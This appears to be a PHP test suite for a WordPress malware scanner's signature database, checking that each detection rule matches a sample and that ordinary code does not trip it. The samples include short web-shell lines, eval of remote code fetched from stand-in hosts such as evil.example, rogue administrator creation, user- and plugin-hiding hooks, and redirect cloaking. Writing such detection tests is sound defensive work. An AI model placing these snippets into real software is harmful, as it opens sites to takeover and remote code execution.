<?php
/**
 * Signature database: loading, validation, matching and per-signature samples.
 */

use Fckmaleware\Signatures;

$sigs = Signatures::from_file( FCKMW_ROOT . '/signatures/signatures.json' );
$raw  = json_decode( (string) file_get_contents( FCKMW_ROOT . '/signatures/signatures.json' ), true );

check( array() === $sigs->invalid(), 'all bundled signatures load (invalid: ' . json_encode( $sigs->invalid() ) . ')' );
check( array() === Signatures::validate( $raw ), 'bundled database passes full validation: ' . implode( '; ', Signatures::validate( $raw ) ) );
check( $sigs->count() >= 40, 'signature database loaded' );

// Every signature carries the metadata the schema requires.
foreach ( $raw['signatures'] as $sig ) {
	foreach ( array( 'id', 'name', 'family', 'category', 'technique', 'severity', 'confidence', 'description', 'source', 'license', 'created', 'updated', 'revision', 'false_positives', 'remediation' ) as $field ) {
		check( array_key_exists( $field, $sig ), "{$sig['id']} has {$field}" );
	}
}

// Each bundled signature must be covered by at least one positive sample.
$positive = array(
	'FMW-PHP-001'   => array( 'php', '<?php eval(base64_decode("ZWNobyAxOw=="));' ),
	'FMW-PHP-002'   => array( 'php', '<?php $x = gzinflate(base64_decode($p));' ),
	'FMW-PHP-003'   => array( 'php', '<?php @system($_GET["cmd"]);' ),
	'FMW-PHP-004'   => array( 'php', '<?php $_POST["f"]($_POST["c"]);' ),
	'FMW-PHP-005'   => array( 'php', '<?php preg_replace("/.*/e", $_POST["x"], "");' ),
	'FMW-PHP-006'   => array( 'php', '<?php $f = create_function("", $_REQUEST["code"]);' ),
	'FMW-PHP-007'   => array( 'php', '<?php $auth_pass = ""; $default_action = "FilesMan";' ),
	'FMW-PHP-008'   => array( 'php', '<?php @include "\x2fh\x6fme\x2fsite\x2fpublic_html\x2fwp-content\x2fuploads\x2f2024\x2ffavicon_7a1b.ico";' ),
	'FMW-PHP-009'   => array( 'php', '<?php $GLOBALS["\x61\x62\x63"] = 1;' ),
	'FMW-PHP-010'   => array( 'php', '<?php $f = ' . str_repeat( 'chr(101).', 14 ) . '"";' ),
	'FMW-PHP-011'   => array( 'php', '<?php $p = "' . str_repeat( 'QUJD', 600 ) . '";' ),
	'FMW-PHP-012'   => array( 'php', '<?php eval(file_get_contents("http://evil.example/p.txt"));' ),
	'FMW-PHP-013'   => array( 'php', '<?php file_put_contents($_GET["n"], $_POST["d"]);' ),
	'FMW-PHP-014'   => array( 'php', "<?php wp_insert_user(array('user_login'=>'x','user_pass'=>'y','role'=>'administrator'));" ),
	'FMW-PHP-015'   => array( 'php', '<?php $s = "' . str_repeat( '\x41', 45 ) . '";' ),
	'FMW-PHP-016'   => array( 'php', "/*<?php /**/\n@eval(\$x);" ),
	'FMW-PHP-017'   => array( 'php', '<?php $f = strrev("edoced_46esab");' ),
	'FMW-PHP-018'   => array( 'php', '<?php move_uploaded_file($_FILES["f"]["tmp_name"], $_POST["dest"]);' ),
	'FMW-PHP-019'   => array( 'php', '<?php $auth_pass = "63a9f0ea7bb98050796b649e85481845";' ),
	'FMW-PHP-020'   => array( 'php', '<?php if (md5($_COOKIE["k"]) == "5f4dcc3b5aa765d61d8327deb882cf99") {}' ),
	'FMW-PHP-021'   => array( 'php', "<?php add_action('pre_user_query', function(\$q){ \$q->query_where .= \" AND user_login != 'x'\"; });" ),
	'FMW-PHP-022'   => array( 'php', "<?php add_filter('all_plugins', function(\$p){ unset(\$p[plugin_basename(__FILE__)]); return \$p; });" ),
	'FMW-PHP-023'   => array( 'php', "<?php if (preg_match('/google/', \$_SERVER['HTTP_REFERER'])) { header('Location: https://x.invalid/'); }" ),
	'FMW-PHP-024'   => array( 'php', "<?php if (strpos(\$ua, 'googlebot') !== false) { echo file_get_contents('https://x.invalid/l.html'); }" ),
	'FMW-PHP-025'   => array( 'php', "<?php file_put_contents('a.php', file_get_contents('https://x.invalid/p.txt'));" ),
	'FMW-PHP-026'   => array( 'php', '<?php eval("?>" . $tpl);' ),
	'FMW-PHP-027'   => array( 'php', '<form enctype="multipart/form-data"><input type=file name=f></form><?php move_uploaded_file($_FILES["f"]["tmp_name"], "x");' ),
	'FMW-PHP-028'   => array( 'php', "<?php include '/home/x/public_html/wp-content/uploads/favicon.ico';" ),
	'FMW-JS-001'    => array( 'js', 'eval(atob("YWxlcnQoMSk="));' ),
	'FMW-JS-002'    => array( 'html', '<script>document.write(unescape("%3Cscript"));</script>' ),
	'FMW-JS-003'    => array( 'js', 'var s=String.fromCharCode(' . str_repeat( '104,', 45 ) . '1);' ),
	'FMW-JS-004'    => array( 'js', 'var s=document.createElement("script");s.src="https://coinhive.com/lib/coinhive.min.js";' ),
	'FMW-JS-005'    => array( 'js', 'var s=document.createElement("script");s.src=atob("aHR0cHM6Ly94");' ),
	'FMW-JS-006'    => array( 'js', 'window.location.href = atob("aHR0cHM6Ly94");' ),
	'FMW-JS-007'    => array( 'html', '<script src="http://203.0.113.7/j.js"></script>' ),
	'FMW-DB-001'    => array( 'db', '<p>Hi</p><script>eval(atob("YQ=="))</script>' ),
	'FMW-DB-002'    => array( 'db', '<iframe src="https://x.invalid/" width="0" height="0"></iframe>' ),
	'FMW-DB-003'    => array( 'db', '<div style="display:none"><a href="https://a.invalid">a</a> <a href="https://b.invalid">b</a> <a href="https://c.invalid">c</a></div>' ),
	'FMW-HTA-001'   => array( 'htaccess', "RewriteEngine On\nRewriteCond %{HTTP_REFERER} .*google.* [OR]\nRewriteCond %{HTTP_REFERER} .*bing.*\nRewriteRule ^(.*)$ http://spam.example/ [R=301,L]\n" ),
	'FMW-HTA-002'   => array( 'htaccess', "AddType application/x-httpd-php .jpg\n" ),
	'FMW-HTA-003'   => array( 'htaccess', "ErrorDocument 404 https://spam.invalid/\n" ),
	'FMW-CFG-001'   => array( 'ini', "auto_prepend_file = /var/www/waf.php\n" ),
	'FMW-CFG-002'   => array( 'ini', "auto_prepend_file = /tmp/x.php\n" ),
	'FMW-IMG-001'   => array( 'image', "\x00\x00\x01\x00GIF89a<?php eval(\$_POST[1]); ?>" ),
	'FMW-BYTES-001' => array( 'image', "GIF89a<?php echo 1; ?>" ),
);

// Rules added in 1.2 use their fixture file as the positive sample.
$from_fixtures = array(
	'FMW-WP-001'  => 'wp-vcd.php',
	'FMW-WP-002'  => 'admin-create.php',
	'FMW-WP-003'  => 'login-stealer.php',
	'FMW-WP-004'  => 'telegram-exfil.php',
	'FMW-WP-005'  => 'option-eval.php',
	'FMW-WP-006'  => 'auth-bypass.php',
	'FMW-WP-007'  => 'head-injection.php',
	'FMW-WP-008'  => 'update-block.php',
	'FMW-PHP-029' => 'shell-title.php',
	'FMW-PHP-030' => 'hex-name.php',
	'FMW-PHP-031' => 'octal-name.php',
	'FMW-PHP-032' => 'rot13-name.php',
	'FMW-PHP-033' => 'probe.php',
	'FMW-PHP-034' => 'extract-call.php',
	'FMW-PHP-035' => 'remote-include.php',
	'FMW-PHP-036' => 'callback-shutdown.php',
	'FMW-PHP-037' => 'silent-exec.php',
	'FMW-PHP-038' => 'short-var.php',
	'FMW-PHP-039' => 'mailer.php',
	'FMW-PHP-040' => 'serverinfo-shell.php',
	'FMW-PHP-041' => 'defacement.html',
	'FMW-PHP-042' => 'data-include.php',
	'FMW-JS-008'  => 'clearfake.js',
	'FMW-JS-009'  => 'fake-update.js',
	'FMW-JS-010'  => 'skimmer.js',
	'FMW-JS-011'  => 'miner.js',
	'FMW-JS-012'  => 'balada.js',
	'FMW-JS-013'  => 'mobile-redirect.js',
	'FMW-JS-014'  => 'packed-post.html',
	'FMW-HTA-004' => 'lockout.htaccess',
	'FMW-HTA-005' => 'spam-rewrite.htaccess',
	'FMW-CFG-003' => 'url-include.ini',
);
foreach ( $from_fixtures as $id => $fixture ) {
	$path            = FCKMW_ROOT . '/tests/fixtures/malware/' . $fixture . '.fixture';
	$positive[ $id ] = array( fixture_type( $path ), (string) file_get_contents( $path ) );
}

/**
 * Rules converted by the threat-intel pipeline (signature-base YARA rules,
 * URLhaus hosts) carry no hand-written sample. One is synthesised from the
 * pattern itself: the literals of its first branch (one-of rules) or of every
 * lookahead in the first branch (all-of rules). Matching that sample proves
 * the rule matches the strings it was converted from.
 */
function fmw_split_top( string $body ): array {
	$parts = array();
	$depth = 0;
	$class = false;
	$cur   = '';
	for ( $i = 0, $n = strlen( $body ); $i < $n; $i++ ) {
		$c = $body[ $i ];
		if ( '\\' === $c ) {
			$cur .= $c . ( $body[ $i + 1 ] ?? '' );
			$i++;
			continue;
		}
		if ( $class ) {
			$class = ']' !== $c;
		} elseif ( '[' === $c ) {
			$class = true;
		} elseif ( '(' === $c ) {
			$depth++;
		} elseif ( ')' === $c ) {
			$depth--;
		} elseif ( '|' === $c && 0 === $depth ) {
			$parts[] = $cur;
			$cur     = '';
			continue;
		}
		$cur .= $c;
	}
	$parts[] = $cur;
	return $parts;
}
function fmw_unwrap( string $body ): string {
	while ( 0 === strpos( $body, '(?:' ) && ')' === substr( $body, -1 ) && 1 === count( fmw_split_top( substr( $body, 3, -1 ) ) ) + ( count( fmw_split_top( $body ) ) - 1 ) ) {
		$inner = substr( $body, 3, -1 );
		// Only unwrap when the outer group spans the whole body.
		$depth = 0;
		$whole = true;
		for ( $i = 0, $n = strlen( $body ); $i < $n; $i++ ) {
			if ( '\\' === $body[ $i ] ) {
				$i++;
				continue;
			}
			$depth += '(' === $body[ $i ] ? 1 : ( ')' === $body[ $i ] ? -1 : 0 );
			if ( 0 === $depth && $i < $n - 1 ) {
				$whole = false;
				break;
			}
		}
		if ( ! $whole ) {
			break;
		}
		$body = $inner;
	}
	return $body;
}
function fmw_literal( string $regex ): string {
	return (string) preg_replace( '/\\\\(.)/s', '$1', $regex );
}
function fmw_synthesize( string $pattern ): string {
	$body = substr( $pattern, 1, strrpos( $pattern, '~' ) - 1 );
	$body = (string) preg_replace( '/\(\?<!\[[^\]]*\]\)|\(\?!\[[^\]]*\]\)/', '', $body );
	$body = (string) preg_replace( '/^\\\\A/', '', $body );
	$body = fmw_unwrap( $body );
	$branch = fmw_unwrap( fmw_split_top( $body )[0] );
	if ( 0 !== strpos( $branch, '(?=' ) ) {
		return fmw_literal( $branch );
	}
	$literals = array();
	while ( 0 === strpos( $branch, '(?=[\s\S]*?' ) ) {
		$depth = 0;
		for ( $i = 0, $n = strlen( $branch ); $i < $n; $i++ ) {
			if ( '\\' === $branch[ $i ] ) {
				$i++;
				continue;
			}
			$depth += '(' === $branch[ $i ] ? 1 : ( ')' === $branch[ $i ] ? -1 : 0 );
			if ( 0 === $depth ) {
				break;
			}
		}
		$literals[] = fmw_literal( substr( $branch, strlen( '(?=[\s\S]*?' ), $i - strlen( '(?=[\s\S]*?' ) ) );
		$branch     = (string) substr( $branch, $i + 1 );
	}
	return implode( "\n", $literals );
}
foreach ( $raw['signatures'] as $sig ) {
	if ( ! isset( $positive[ $sig['id'] ] ) && 'regex' === $sig['technique'] && 0 === strpos( $sig['id'], 'FMW-SB-' ) ) {
		$positive[ $sig['id'] ] = array( $sig['targets'][0], fmw_synthesize( $sig['pattern'] ) );
	} elseif ( ! isset( $positive[ $sig['id'] ] ) && 'regex' === $sig['technique'] && 0 === strpos( $sig['id'], 'FMW-UH-' ) && preg_match( '/\(\?:([a-z0-9\\\\.-]+)/i', $sig['pattern'], $host ) ) {
		$positive[ $sig['id'] ] = array( 'html', '<script src="https://' . fmw_literal( $host[1] ) . '/j.js"></script>' );
	}
}

foreach ( $raw['signatures'] as $sig ) {
	check( isset( $positive[ $sig['id'] ] ) || 'hash' === $sig['technique'], "{$sig['id']} has a positive test sample" );
}
foreach ( $positive as $id => list( $type, $sample ) ) {
	$ids = array_map(
		static function ( $m ) {
			return $m['signature']['id'];
		},
		$sigs->match( $sample, $type )
	);
	check( in_array( $id, $ids, true ), "{$id} matches its sample (got: " . implode( ',', $ids ) . ')' );
}

// Ordinary WordPress-style code must not trip any signature at "malicious" confidence.
$benign = array(
	array( 'php', "<?php\n\$data = base64_decode( get_option( 'my_plugin_blob' ) );\necho esc_html( \$data );" ),
	array( 'php', "<?php\nif ( isset( \$_GET['page'] ) ) { \$page = sanitize_key( \$_GET['page'] ); }" ),
	array( 'php', "<?php\n\$out = preg_replace( '/\\s+/', ' ', \$in );\n\$out = preg_replace( '#<br\\s*/?>#i', \"\\n\", \$out );" ),
	array( 'php', "<?php\nadd_action( 'init', function () { register_post_type( 'book', array( 'public' => true ) ); } );" ),
	array( 'php', "<?php\n\$img = 'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg==';" ),
	array( 'php', "<?php\n\$user_id = wp_insert_user( array( 'user_login' => \$login, 'role' => 'subscriber' ) );" ),
	array( 'php', "<?php\ninclude __DIR__ . '/views/settings.php';" ),
	array( 'js', "jQuery(function(\$){ \$('.btn').on('click', function(){ \$(this).toggleClass('on'); }); });" ),
	array( 'js', 'const label = String.fromCharCode(65, 66, 67);' ),
	array( 'htaccess', "# BEGIN WordPress\nRewriteEngine On\nRewriteBase /\nRewriteRule ^index\\.php$ - [L]\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteRule . /index.php [L]\n# END WordPress\n" ),
	array( 'db', '<p>Welcome! <a href="https://example.com">Visit</a></p><iframe src="https://www.youtube.com/embed/x" width="560" height="315"></iframe>' ),
	array( 'image', "\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR" . str_repeat( "\x00\xff", 64 ) ),
);
foreach ( $benign as $i => list( $type, $sample ) ) {
	$hits = array();
	foreach ( $sigs->match( $sample, $type ) as $m ) {
		$hits[] = $m['signature']['id'];
	}
	check( array() === $hits, "benign sample #{$i} produced no findings (got: " . implode( ',', $hits ) . ')' );
}

// Match metadata.
$m = $sigs->match( "<?php\n// header\n\neval(base64_decode('x'));\n", 'php' );
check( 4 === ( $m[0]['line'] ?? null ), 'line number of a match is reported' );
check( false !== strpos( $m[0]['excerpt'] ?? '', 'eval(base64_decode' ), 'excerpt contains the match' );
check( array() === $sigs->match( 'eval(base64_decode("x"));', 'htaccess' ), 'PHP signatures ignored for .htaccess' );

// File type mapping.
check( 'php' === Signatures::file_type( 'wp-content/plugins/x/x.php' ), 'php file type' );
check( 'php' === Signatures::file_type( 'shell.PHTML' ), 'phtml is php (case-insensitive)' );
check( 'htaccess' === Signatures::file_type( 'wp-content/uploads/.htaccess' ), '.htaccess type' );
check( 'ini' === Signatures::file_type( '.user.ini' ), '.user.ini type' );
check( 'image' === Signatures::file_type( 'favicon_abc.ico' ), '.ico always scanned' );
check( null === Signatures::file_type( 'photo.jpg' ), 'jpg skipped by default' );
check( 'image' === Signatures::file_type( 'photo.jpg', true ), 'jpg scanned when enabled' );
check( null === Signatures::file_type( 'readme.txt' ), 'txt skipped' );

// Techniques: hash and byte patterns.
$hash_db = new Signatures(
	array(
		'version'    => '2026.01.01',
		'signatures' => array(
			array( 'id' => 'T-HASH', 'technique' => 'hash', 'sha256' => array( hash( 'sha256', 'known bad sample' ) ), 'targets' => array( 'any' ), 'confidence' => 100 ),
			array( 'id' => 'T-BYTES', 'technique' => 'bytes', 'bytes' => bin2hex( 'MAGIC' ), 'nocase' => true, 'targets' => array( 'php' ) ),
		),
	)
);
check( 'T-HASH' === ( $hash_db->match_hash( hash( 'sha256', 'known bad sample' ) )['id'] ?? null ), 'hash signature matches by SHA-256' );
check( null === $hash_db->match_hash( hash( 'sha256', 'other' ) ), 'hash signature does not match other content' );
check( 1 === count( $hash_db->match( 'xx magic yy', 'php' ) ), 'nocase byte pattern matches' );
check( 2 === $hash_db->count() && 1 === $hash_db->hash_count(), 'hash signatures counted separately' );

// Validation rejects unsafe or malformed signatures.
$reject = static function ( array $sig ) {
	return null !== Signatures::check( Signatures::normalize( $sig ) );
};
check( $reject( array( 'id' => 'X-1', 'pattern' => '~(unclosed~' ) ), 'uncompilable regex rejected' );
check( $reject( array( 'id' => 'X-2', 'pattern' => '/abc/e' ) ), '/e modifier and non-~ delimiter rejected' );
check( $reject( array( 'id' => 'X-3', 'pattern' => '~abc~ie' ) ), 'e flag rejected even with ~ delimiter' );
check( $reject( array( 'id' => 'bad id', 'pattern' => '~a~' ) ), 'invalid id rejected' );
check( $reject( array( 'id' => 'X-4', 'pattern' => '~a~', 'targets' => array( 'exe' ) ) ), 'unknown target rejected' );
check( $reject( array( 'id' => 'X-5', 'technique' => 'bytes', 'bytes' => 'zz' ) ), 'non-hex byte pattern rejected' );
check( $reject( array( 'id' => 'X-6', 'technique' => 'hash', 'sha256' => array( 'abc' ) ) ), 'short hash rejected' );
check( null !== Signatures::check_regex_performance( '~(a+)+$~' ), 'catastrophic backtracking pattern rejected by stress probes' );
check( null === Signatures::check_regex_performance( '~\beval\s*\(~i' ), 'ordinary pattern passes stress probes' );

$doc_errors = Signatures::validate(
	array(
		'version'    => '2026.01.01',
		'signatures' => array(
			array( 'id' => 'D-1', 'pattern' => '~a~', 'name' => 'a', 'family' => 'f', 'category' => 'c', 'description' => 'd', 'source' => 's', 'license' => 'l', 'created' => '2026-01-01' ),
			array( 'id' => 'D-1', 'pattern' => '~b~', 'name' => 'b', 'family' => 'f', 'category' => 'c', 'description' => 'd', 'source' => 's', 'license' => 'l', 'created' => '2026-01-01' ),
		),
	)
);
check( 1 === count( $doc_errors ) && false !== strpos( $doc_errors[0], 'duplicate' ), 'duplicate ids rejected' );
check( in_array( 'version must look like YYYY.MM.DD[.N]', Signatures::validate( array( 'version' => 'latest', 'signatures' => array() ) ), true ), 'bad version rejected' );
check( in_array( 'unsupported schema 99', Signatures::validate( array( 'schema' => 99, 'version' => '2026.01.01', 'signatures' => array( array() ) ) ), true ), 'future schema rejected' );

// Invalid entries are skipped at load time, not fatal; schema-1 entries still load.
$mixed = new Signatures( array( 'signatures' => array( array( 'id' => 'BAD', 'pattern' => '~(unclosed~' ), array( 'id' => 'OK-1', 'pattern' => '~ok~', 'severity' => 'high' ) ) ) );
check( array( 'BAD' ) === array_keys( $mixed->invalid() ) && 1 === count( $mixed->all() ), 'invalid pattern skipped, schema-1 entry loaded' );
check( 75 === $mixed->all()[0]['confidence'], 'schema-1 entry gets a default confidence' );

// Runtime PCRE failures are recorded, not silent.
$slow = new Signatures( array( 'signatures' => array( array( 'id' => 'SLOW', 'pattern' => '~(a+)+$~' ) ) ) );
ini_set( 'pcre.backtrack_limit', '1000' );
ini_set( 'pcre.jit', '0' );
$slow->match( str_repeat( 'a', 5000 ) . 'b', 'php' );
ini_restore( 'pcre.backtrack_limit' );
ini_restore( 'pcre.jit' );
check( isset( $slow->runtime_errors()['SLOW'] ), 'PCRE runtime failure recorded for the signature' );

// Entropy helper.
check( Signatures::entropy( str_repeat( 'a', 100 ) ) < 0.01, 'entropy of a constant string is ~0' );
check( Signatures::entropy( base64_encode( random_bytes( 3000 ) ) ) > 5.8, 'entropy of random base64 is ~6' );
